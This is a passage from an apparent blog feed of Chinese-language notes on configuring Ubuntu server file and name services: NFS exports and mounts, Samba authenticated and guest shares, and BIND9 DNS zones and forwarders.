class="comment"># 查看共享目录</span></span><br><span class="line">cat /var/lib/nfs/etab<span class="comment"># 共享目录</span></span><br><span class="line">cat /var/lib/nfs/xtab<span class="comment"># 客户端信息</span></span><br></pre></td></tr></table></figure><p><strong>共享权限</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ro/rw<span class="comment"># 只读/只写</span></span><br><span class="line">sync / async<span class="comment"># 同步写入硬盘 / 暂存于内存中</span></span><br><span class="line">all_squash<span class="comment"># 所有用户全部映射为nobody</span></span><br><span class="line">anonuid / anongid<span class="comment"># 支付那个匿名ID（默认65534）</span></span><br><span class="line">secure / insecure<span class="comment"># 使用1024以下/以上端口</span></span><br><span class="line">hide / no_hide<span class="comment"># 共享 / 不共享NFS子目录</span></span><br></pre></td></tr></table></figure><p><strong>客户端挂载</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 和本地挂载设备一样(挂载到本地，但是访问是通过网络流量的)</span></span><br><span class="line">sudo mount 192.168.0.30:/<span class="built_in">export</span>/publicmy_nfs/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文件的话</span></span><br><span class="line">1.临时获取root权限，会默认转为nobody</span><br><span class="line">sudo xxxxx </span><br><span class="line">2.</span><br><span class="line">chmod修改其他用户的权限后，直接写入即可(客户端的uid与服务端的uid相同的话)</span><br></pre></td></tr></table></figure><p><strong>启动挂载</strong><br>风险：nfs服务器如果出现问题，本地机器启动就会特别慢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/fstab</span></span><br><span class="line">192.168.1.30:/home/my_nfs/nfs no_auto,nofail,noatime,nolock,intr,tcp,actimeo=1800 0 0  <span class="comment"># 建议 no_auto 不自动挂载</span></span><br></pre></td></tr></table></figure><p><strong>其他命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rpcinfo -p 192.168.1.30  <span class="comment"># 查询RPC服务注册状态(客户端与服务端都可以执行)</span></span><br><span class="line">tail /var/<span class="built_in">log</span>/kern.log <span class="comment"># 服务器日志</span></span><br><span class="line">showmount -e localhost <span class="comment"># 显示共享目录</span></span><br><span class="line">df -h <span class="comment"># 客户端查看挂载</span></span><br></pre></td></tr></table></figure><p><strong>企业环境有统一域名和身份验证时</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 也要配置这个</span></span><br><span class="line">sudo vim /etc/idpamd.conf</span><br><span class="line">Domain = lab.com</span><br></pre></td></tr></table></figure><p><strong>Windows客户端</strong><br>企业版才可以添加nfs的支持</p><h2 id="SAMBA服务"><a href="#SAMBA服务" class="headerlink" title="SAMBA服务"></a><font color="red">SAMBA服务</font></h2><p><strong>SMB / CIFS 协议</strong></p><ul><li>全称Server message block / Common internet file system</li><li>最早由IBM研发，后由微软采用并不断完善</li><li>Windows文件和打印共享（之前使用的SMB协议, 后来改进为cifs协议）</li><li>端口：TCP 139(局域网), 445() / UDP 137(用来名称解析),  138</li><li>Samba 是开源世界逆向了SMB协议后打造的兼容微软SMB的文件共享服务</li><li>Samba还有其他功能、用途和使用场景</li></ul><p><strong>功能不仅限于此，但最常用的用途，还是做文件共享服务：</strong></p><ul><li>NFS只适用于类Unix系统环境</li><li>Samba适用与Windows、Linux混合环境的文件共享需要</li></ul><p><strong>Samba实现了CIFS服务的四个基本功能</strong><br>1.文件和打印共享<br>2.认证和授权<br>3.名称解析<br>4.服务宣告(browsing)</p><p><strong>传输协议：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NetBIOS<span class="comment"># 局域网</span></span><br><span class="line">NetBIOS over TCP/IP<span class="comment"># 跨网段(把NetBIOS数据包封装之后跨网络传输)</span></span><br></pre></td></tr></table></figure><p><strong>后台进程</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Smbd<span class="comment"># 文件共享主进程 TCP: 139/445</span></span><br><span class="line">Nmbd<span class="comment"># WINS通信、名称解析 UDP: 137/138</span></span><br><span class="line">Winbindd<span class="comment"># 同步系统账号(把Linux系统的账户拷到samba的用户数据库中进行处理)</span></span><br><span class="line">其他10多个进程</span><br></pre></td></tr></table></figure><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install samba libpam-winbind</span><br></pre></td></tr></table></figure><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/samba/dhcp.conf<span class="comment"># 指定WINS服务器（跨网段时候用）</span></span><br><span class="line">/etc/samba/smb.conf<span class="comment"># 主配置文件</span></span><br></pre></td></tr></table></figure><h6 id="一-配置验证用户名的Samba服务"><a href="#一-配置验证用户名的Samba服务" class="headerlink" title="一. 配置验证用户名的Samba服务"></a>一. 配置验证用户名的Samba服务</h6><p>1.配置文件/etc/samba/smb.conf    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">workgroup = WORKGROUP  <span class="comment"># [global]  工作组：net config worktation查看工作组</span></span><br><span class="line"></span><br><span class="line">[Private]<span class="comment"># 起个名(共享文件夹的名称)</span></span><br><span class="line">comment = prvivate share<span class="comment"># 描述</span></span><br><span class="line">path = /srv/private/<span class="comment"># 共享路径</span></span><br><span class="line">browseable = no<span class="comment"># 是否允许访问者可显示它这个共享文件夹(完整账号)</span></span><br><span class="line">guest ok = no<span class="comment"># 禁用来宾账号</span></span><br><span class="line">writable=yes<span class="comment"># 可读写(read only=yes)</span></span><br><span class="line">create mask = 0700 <span class="comment"># 新建文件权限</span></span><br><span class="line">vaild users=@samba<span class="comment"># 可访问共享的用户组(稍后会创建)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>2.创建用户/组/共享文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser user1</span><br><span class="line">sudo groupadd smaba  <span class="comment"># 上面配置的组的名称</span></span><br><span class="line">sudo gpasswd -a user1 samba</span><br><span class="line">sudo smbpasswd -a user1<span class="comment"># 设置用户SMB密码(不是操作系统的密码)</span></span><br><span class="line">sudo mkdir /srv/private/  <span class="comment"># 创建共享目录</span></span><br><span class="line">sudo setfacl -R -m <span class="string">"g:samba:rwx"</span> /srv/private/<span class="comment"># 设置acl访问控制列表，-m修改 (ll之后看到后面有个+号，表示有更多权限) </span></span><br><span class="line">getfacl /srv/private/  <span class="comment"># 查看权限</span></span><br><span class="line">testparm<span class="comment"># 检测</span></span><br><span class="line">sudo systemctl restart smbd.service nmbd.service</span><br></pre></td></tr></table></figure><p><strong>客户端访问</strong><br>win上可以访问Linux上的Samba文件夹, Linux上也可以访问Linux上的Samba文件夹</p><p>Linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 图形化</span></span><br><span class="line">点击Connect to Server，输入地址：</span><br><span class="line">smb://192.168.0.130</span><br><span class="line"></span><br><span class="line"><span class="comment">#  命令行</span></span><br><span class="line">smbclient -L //192.168.0.130   <span class="comment"># 查看目标都有哪些共享信息</span></span><br><span class="line">smbclient -L //192.168.0.130 -U user1</span><br><span class="line">mount -t cifs -o username=user1  //192.168.0.130/private/public/mnt  <span class="comment"># 挂载</span></span><br></pre></td></tr></table></figure><p>Windows</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># win+R</span></span><br><span class="line">\\192.168.0.130</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行工具来访问</span></span><br><span class="line">net user <span class="comment"># 查看会话</span></span><br><span class="line">net user \\host\private/user1 passwd</span><br><span class="line">net user \\host\private /delete  <span class="comment"># 删除已经建立的会话</span></span><br><span class="line">net user g:  \\host\private <span class="comment"># 映射为本地盘符</span></span><br><span class="line"></span><br><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p>共享名称以<code>$</code>结尾的，在win上会认为隐藏共享(Linux上还是会显示)<br><img src="/ubuntu-server-文件服务/20200414155510404_5305.png" alt></p><h6 id="二-配置公开访问的Samba服务-开放共享文件件"><a href="#二-配置公开访问的Samba服务-开放共享文件件" class="headerlink" title="二. 配置公开访问的Samba服务(开放共享文件件)"></a>二. 配置公开访问的Samba服务(开放共享文件件)</h6><p>将不提供登录账号的用户映射为guest，无需输入密码  </p><p>1.配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置文件/etc/samba/smb.conf</span></span><br><span class="line">[Global]<span class="comment"># 起个名(共享文件夹的名称)</span></span><br><span class="line">workgroup = WORKGROUP </span><br><span class="line">security = user <span class="comment"># share已废止、Domain、ADS、Server</span></span><br><span class="line">map to guest = bad user <span class="comment"># 映射为guest</span></span><br><span class="line">guest ok = yes<span class="comment"># 允许来宾账号</span></span><br></pre></td></tr></table></figure><p>2.开放共享文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Public]</span><br><span class="line">comment = public share</span><br><span class="line">path = /srv/public/</span><br><span class="line">browseable = yes<span class="comment"># 允许看到</span></span><br><span class="line">writable = yes</span><br><span class="line">guest ok = yes</span><br></pre></td></tr></table></figure><p>3.创建共享目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p  /srv/public/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置访问列表（设置user,nobody代表guest）</span></span><br><span class="line">sudo setfacl -R -m <span class="string">"u:nobody:rwx"</span> /srv/public/</span><br><span class="line">getfacl /srv/public/  <span class="comment"># 查看权限</span></span><br><span class="line"></span><br><span class="line">testparm<span class="comment"># 检测</span></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">sudo systemctl restart smbd.service nmbd.service</span><br></pre></td></tr></table></figure><p><strong>客户端访问</strong><br>同上</p><p><strong>服务器信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbd --version  <span class="comment"># 查看版本</span></span><br><span class="line"></span><br><span class="line">sudo smbstatus<span class="comment"># 查看状态和连接状况</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件服务&quot;&gt;&lt;a href=&quot;#文件服务&quot; class=&quot;headerlink&quot; title=&quot;文件服务&quot;&gt;&lt;/a&gt;文件服务&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;我的就是你的 -  你的还是你的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;网络诞生最初的动因是去
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="ubuntu" scheme="http://www.xpshuai.cn/tags/ubuntu/"/>
    
      <category term="文件服务" scheme="http://www.xpshuai.cn/tags/%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu server-DNS服务</title>
    <link href="http://www.xpshuai.cn/ubuntu-server-DNS%E6%9C%8D%E5%8A%A1/"/>
    <id>http://www.xpshuai.cn/ubuntu-server-DNS服务/</id>
    <published>2020-04-12T13:01:58.000Z</published>
    <updated>2020-05-12T21:08:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h1><blockquote><p>您是谁家老小</p></blockquote><h2 id="域名解析原理"><a href="#域名解析原理" class="headerlink" title="域名解析原理"></a><font color="red">域名解析原理</font></h2><p>DNS：将容易基于的主机名映射到IP地址<br><strong>计算机命名规范：</strong></p><ul><li>Netbiso名称（微软）</li><li>Hostname</li><li>DNS分布式名称系统(但是不同的dns服务器是有层级关系的，呈树状结构)</li></ul><p><strong>DNS服务结构：</strong></p><ul><li>域名          比如：sina.com.cn</li><li>FQDN(fully qualified domain names )     比如:<a href="http://www.sina.com.cn" target="_blank" rel="noopener">www.sina.com.cn</a>  即主机名(www)+域名(sina.com.cn)</li></ul><p><strong>DNS记录类型</strong></p><table><thead><tr><th>记录类型</th><th>作用</th></tr></thead><tbody><tr><td>NS</td><td>域名服务器记录(找a.com与里面的域名对应的ip的话，就要去问域名服务器,问他www的对应的主机的ip地址是多少)，一个域可以有多个域名服务器(<code>dig a.com ns</code>)</td></tr><tr><td>A</td><td>主机记录(域名解析到ip地址)</td></tr><tr><td>CNAME</td><td>别名记录(给域名指向另一个A记录的域名,可以叠加)</td></tr><tr><td>MX</td><td>邮件交换记录</td></tr><tr><td>PTR</td><td>指针记录（反向查询）</td></tr><tr><td>SOA</td><td>起始授权记录(soa记录对应的域名服务器，才是合法的)</td></tr></tbody></table><p><img src="/ubuntu-server-DNS服务/20200405094807682_18444.png" alt></p><p><strong>DNS命名空间</strong><br><img src="/ubuntu-server-DNS服务/20200405100714099_17972.png" alt><br><code>www.ubuntu.com.</code>严格来说是有点的，但是为了方便，最后面不写点也可以</p><p><strong>DNS查询：</strong> 逐级委派<br>由机构<code>LCANN</code>负责管理, 负责根域<code>.</code></p><h2 id="DNS查询寻结构"><a href="#DNS查询寻结构" class="headerlink" title="DNS查询寻结构"></a><font color="red">DNS查询寻结构</font></h2><p><strong>三种DNS服务器：</strong></p><ol><li>Master(DNS域里面中，master服务器可以修改DNS记录，在master上做得修改也会自动同步到其他slave等dns服务器) 一般只设置一台</li><li>Slave（数据文件来自master的同步）  – 前两者两种服务器都会保存dns记录类型</li><li>Cache    （不保存任何记录，一般都是运营商提供的，跟下面的dns查询有关系，意义：本个区域内有缓存了减少dns会话的流量，提高了效率，减轻了带宽占用，超出生命周期之后才会再次查询）<ol><li>TTL<br>4.Forward（转发类型的，比如会去转发给本地运营商的dns服务器(比如家用无线路由器会企业的域控)，而不是自己去进行递归查询啥的）<br><img src="/ubuntu-server-DNS服务/20200405101258270_2676.png" alt></li></ol></li></ol><p>同时是三种角色</p><h5 id="安装DNS服务"><a href="#安装DNS服务" class="headerlink" title="安装DNS服务"></a>安装DNS服务</h5><p>使用最广的DNS服务的软件包：<code>BIND（Berkley Internet Naming Daemon）</code><br>在ubuntu上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装bind(即软件包) 9是版本，dnsutils是用来检查的软件包</span></span><br><span class="line">sudo apt install bind9 dnsutils</span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS服务区只保存和解析本域各种域名记录</span></span><br><span class="line"><span class="comment"># DNS服务都包含13个根域名服务器地址   </span></span><br><span class="line">cat /etc/<span class="built_in">bind</span>/db.root    <span class="comment"># -&gt; ipv4和ipv6地址(AAAA记录)</span></span><br><span class="line"><span class="comment"># 事实分布于世界的数百台根域服务器，不只是13个（国内是有根域服务器的）</span></span><br></pre></td></tr></table></figure><p><strong>DNS服务器的DNS服务器配置</strong><br>自己做迭代<br>指定递归域名服务器（自建尽量禁用其他地址来连接我们递归查询功能, 除非查询的是域内的域名）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 见 DNS主备部署</span></span><br></pre></td></tr></table></figure><p><strong>DNS默认服务端口</strong><br>TCP 53  / UDP 53</p><blockquote><p>这里是以<code>Bind</code>软件包为例</p></blockquote><p><strong>还有其他软件包：</strong></p><ol><li>Djbdns<ul><li>衍生版本：Dbndns, ndjbsns</li></ul></li><li>dhamasq<ul><li>DNS + DHCP打包的轻量解决方案 –&gt; 经常用于<code>无线渗透，搭建无线AP</code><br>3.PowerDNS</li><li>模块化开源DNS服务器软件</li></ul></li></ol><h2 id="DNS主备部署"><a href="#DNS主备部署" class="headerlink" title="DNS主备部署"></a><font color="red">DNS主备部署</font></h2><p>对于dns服务器本身的dns地址可以执行运营商等的地址</p><h3 id="正向区域"><a href="#正向区域" class="headerlink" title="正向区域"></a><font color="green">正向区域</font></h3><h4 id="配置Master-DNS服务器"><a href="#配置Master-DNS服务器" class="headerlink" title="配置Master DNS服务器"></a>配置<code>Master</code> DNS服务器</h4><h6 id="执行区域文件（正向区域-–-gt-域名解析为ip）"><a href="#执行区域文件（正向区域-–-gt-域名解析为ip）" class="headerlink" title="执行区域文件（正向区域 –&gt; 域名解析为ip）"></a>执行区域文件（正向区域 –&gt; 域名解析为ip）</h6><blockquote><p>企业内部自用， 一般一个域中会有两个DNS服务器</p></blockquote><p>1.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/bind/named.conf.local</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># zone定义一个区域， type类型，指定存具体记录的文件</span></span><br><span class="line">zone <span class="string">"lab.com"</span>&#123;</span><br><span class="line"><span class="built_in">type</span> master;</span><br><span class="line">file <span class="string">"/etc/bind/db.lab.com"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.编辑区域文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拷贝一个现有的区域文件模板，进行修改(也可手动创建)</span></span><br><span class="line">cp db.local db.lab.com</span><br><span class="line"></span><br><span class="line">sudo vim db.lab.com</span><br><span class="line"><span class="comment"># 文件内容</span></span><br><span class="line">; BIND data file <span class="keyword">for</span> lab.com loopback interface</span><br><span class="line">;</span><br><span class="line"><span class="variable">$TTL</span>604800    <span class="comment"># 允许缓存DNS服务器的缓存时长，单位s， 1D -&gt;一天,12h -&gt; 12小时</span></span><br><span class="line">@INSOAsoa.lab.com. root.localhost. (  <span class="comment"># @表示本域的域名，   IN -&gt;互联网记录类型， SOA起始授权记录; root.localhost.管理员邮箱地址(点就是@ -&gt;root.lab.com.), 括号多行内容</span></span><br><span class="line">      2; Serial    <span class="comment"># 版本号，如果slave的与master服务器字段值相同则不同步数据，不同则同步数据</span></span><br><span class="line"> 604800; Refresh<span class="comment"># slave向master的更新周期</span></span><br><span class="line">  86400; Retry     <span class="comment"># 重试周期</span></span><br><span class="line">2419200; Expire<span class="comment"># 最大重试时间</span></span><br><span class="line"> 604800 ); Negative Cache TTL</span><br><span class="line">;</span><br><span class="line">@INNSns1<span class="comment"># NS记录，dns域的域名服务器的名称</span></span><br><span class="line">@INA10.1.8.128<span class="comment"># 给哪个域名创建A记录，访问本机的域名解析到哪里</span></span><br><span class="line">@INAAAA::1     <span class="comment"># ipv6使用的</span></span><br><span class="line">ns1INA10.1.8.10   <span class="comment"># 给域的ns记录域名解析到哪个ip</span></span><br><span class="line">soaINA10.1.8.10</span><br><span class="line">wwwINCNAME web       <span class="comment"># 把www.lab.com解析为web.com.lab</span></span><br><span class="line">webINCNAME w3<span class="comment"># 有一个CNAME记录</span></span><br><span class="line">w3INA  10.1.8.128 <span class="comment"># 最终解析为A记录的ip</span></span><br><span class="line">@INMX 10 mx1     <span class="comment"># 优先级，数字越小优先级越高</span></span><br><span class="line">@INMX 10 mx2    </span><br><span class="line">mx1INA10.1.8.1   <span class="comment"># 再把mx的域名解析到ip</span></span><br><span class="line">mx2INA10.1.8.2</span><br><span class="line">ftp INA 10.1.8.128</span><br><span class="line">ftp INA 10.1.8.129  <span class="comment"># 同一个a记录命名指向不同的ip，不区分优先级，而是轮询</span></span><br></pre></td></tr></table></figure><p>3.重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart bind9</span><br><span class="line">sudo systemctl status bind9</span><br></pre></td></tr></table></figure><p>4.服务器配置检查</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo named-checkconf   <span class="comment"># 检查语法错误</span></span><br><span class="line"></span><br><span class="line">sudo named-checkzone lab.com /etc/<span class="built_in">bind</span>/db.lab.com  <span class="comment"># 正向区域检查</span></span><br><span class="line"></span><br><span class="line">sudo named-checkzone lab.com /etc/<span class="built_in">bind</span>/db.lab.com  <span class="comment"># 反向区域检查</span></span><br></pre></td></tr></table></figure><p>5.客户端解析验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dig在win上没有</span></span><br><span class="line">ping lab.com</span><br><span class="line"></span><br><span class="line">dig lab.com ns @10.1.8.10  <span class="comment"># 解析ns记录，@dns服务器</span></span><br><span class="line"></span><br><span class="line">dig www.com @10.1.8.10</span><br><span class="line"></span><br><span class="line">dig com a @10.1.8.100   <span class="comment"># 不指定的话，默认就是a记录</span></span><br><span class="line"></span><br><span class="line">dig lab.com mx @10.1.8.100</span><br></pre></td></tr></table></figure><p>客户端解析验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nslookup在linux和win都有</span></span><br><span class="line"></span><br><span class="line">nslookup</span><br><span class="line"><span class="comment"># 设置参数 </span></span><br><span class="line">server 10.1.8.100    <span class="comment"># dns服务器</span></span><br><span class="line"><span class="built_in">set</span> q=ns   <span class="comment"># 查询记录类型</span></span><br><span class="line">lab.com<span class="comment"># 查询目标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Windows本机hi进行dns本地缓存， 而Linux本地是不做缓存的</span></span><br><span class="line">ipconfig /displaydns   <span class="comment"># 显示本地缓存的dns记录</span></span><br><span class="line">ipconfig /flushdns     <span class="comment"># 清空本地缓存的dns记录</span></span><br></pre></td></tr></table></figure><h4 id="配置Cache-DNS服务器"><a href="#配置Cache-DNS服务器" class="headerlink" title="配置Cache DNS服务器"></a>配置<code>Cache</code> DNS服务器</h4><p>主配置文件<code>/etc/bind/named.conf</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只是一个入口文件</span></span><br><span class="line">include <span class="string">"/etc/bind/named.conf.options"</span>;  <span class="comment">#  规范: 【分号结尾】</span></span><br><span class="line">include <span class="string">"/etc/bind/named.conf.local"</span>;    <span class="comment">#</span></span><br><span class="line">include <span class="string">"/etc/bind/named.conf.default-zones"</span>;</span><br></pre></td></tr></table></figure><h6 id="全局转发DNS服务器"><a href="#全局转发DNS服务器" class="headerlink" title="全局转发DNS服务器"></a>全局转发DNS服务器</h6><p>对于不属于我们域的解析转发给其他dns服务器  （我们内部的nds服务器不知道怎么解析之后要去找谁）<br>配置转发器的文件: <code>vim /etc/bind/named.conf.options</code><br>1.全局转发：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">acl <span class="string">"local"</span>&#123;   <span class="comment"># options 块之前</span></span><br><span class="line">10.1.8.0/24；<span class="comment"># 本地网段(为公司内部的地址提供服务)</span></span><br><span class="line">&#125;； </span><br><span class="line">options &#123;</span><br><span class="line">recursion yes;   <span class="comment"># recursion即递归查询(公网上的dns服务器一般是禁止递归查询的)</span></span><br><span class="line">allow-recursion &#123; <span class="built_in">local</span>; &#125;;  <span class="comment"># 允许对我发起递归查询的地址范围</span></span><br><span class="line">listen-on &#123; 10.0.2.53; &#125;;  <span class="comment"># 指定侦听的地址</span></span><br><span class="line">forwarders &#123;</span><br><span class="line">9.9.9.9;  <span class="comment"># 全局性的转发器，转发给谁</span></span><br><span class="line">8.8.8.8;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>sudo systemctl restart bind9.service</code></p><p>2.局部转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zone <span class="string">"sina.com.cn"</span> &#123;   <span class="comment"># 创建一个域名</span></span><br><span class="line"><span class="built_in">type</span> forward;</span><br><span class="line">forwarders &#123;</span><br><span class="line">202.99.96.68;  <span class="comment">#局部转发，针对某个域名转发给某一个ip</span></span><br><span class="line">202.106.0.20;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>sudo systemctl restart bind9.service</code></p><p>解析过之后，就有了缓存，在一定时间内就不会转发再进行请求了  </p><h3 id="反向区域"><a href="#反向区域" class="headerlink" title="反向区域"></a><font color="green">反向区域</font></h3><h4 id="配置Master-DNS服务器-1"><a href="#配置Master-DNS服务器-1" class="headerlink" title="配置Master DNS服务器"></a>配置<code>Master DNS</code>服务器</h4><h6 id="（i反向区域-ip解析为域名-–-gt-反垃圾邮件）"><a href="#（i反向区域-ip解析为域名-–-gt-反垃圾邮件）" class="headerlink" title="（i反向区域: ip解析为域名 –&gt; 反垃圾邮件）"></a>（i反向区域: ip解析为域名 –&gt; 反垃圾邮件）</h6><p>反垃圾邮件：攻击者伪造域内邮件发送恶意文件；检查外部的邮件是否是从真正的邮件服务器发送过来的<br>1.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/bind/named.conf.local</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># zone定义一个区域， type类型，指定存具体记录的文件</span></span><br><span 